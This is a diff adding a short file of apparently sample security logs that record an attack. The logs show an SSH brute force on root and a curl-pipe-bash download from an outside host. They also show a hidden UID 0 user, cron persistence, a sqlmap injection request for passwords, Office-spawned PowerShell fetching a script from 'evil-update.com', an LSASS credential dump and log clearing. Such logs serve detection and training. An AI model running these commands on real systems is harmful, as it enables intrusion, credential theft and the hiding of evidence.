@@ -1,0 +1,14 @@
+Sep 29 02:14:07 srv-web sshd[4121]: Failed password for root from 185.220.101.47 port 51022 ssh2
+Sep 29 02:14:09 srv-web sshd[4121]: Failed password for root from 185.220.101.47 port 51022 ssh2
+Sep 29 02:14:12 srv-web sshd[4125]: Failed password for admin from 185.220.101.47 port 51030 ssh2
+Sep 29 02:14:15 srv-web sshd[4125]: Failed password for admin from 185.220.101.47 port 51030 ssh2
+Sep 29 02:14:18 srv-web sshd[4130]: Failed password for root from 185.220.101.47 port 51041 ssh2
+Sep 29 02:14:22 srv-web sshd[4133]: Accepted password for root from 185.220.101.47 port 51049 ssh2
+Sep 29 02:16:40 srv-web sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://185.220.101.47/x.sh | bash
+Sep 29 02:17:03 srv-web useradd[4210]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash
+Sep 29 02:17:30 srv-web crontab[4231]: (root) REPLACE (root) @reboot /tmp/.x/update.sh
+Sep 29 02:18:02 srv-web bash[4250]: history -c
+185.220.101.47 - - [29/Sep/2026:02:10:11 +0000] "GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 5123 "-" "sqlmap/1.8"
+2026-09-29 09:41:12 WIN-PC01 Sysmon EventID=1 ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil-update.com/a.ps1')"
+2026-09-29 09:43:55 WIN-PC01 Sysmon EventID=1 Image=C:\Windows\System32\rundll32.exe CommandLine="rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\lsass.dmp full"
+2026-09-29 09:45:20 WIN-PC01 Sysmon EventID=1 Image=C:\Windows\System32\wevtutil.exe CommandLine="wevtutil cl Security"
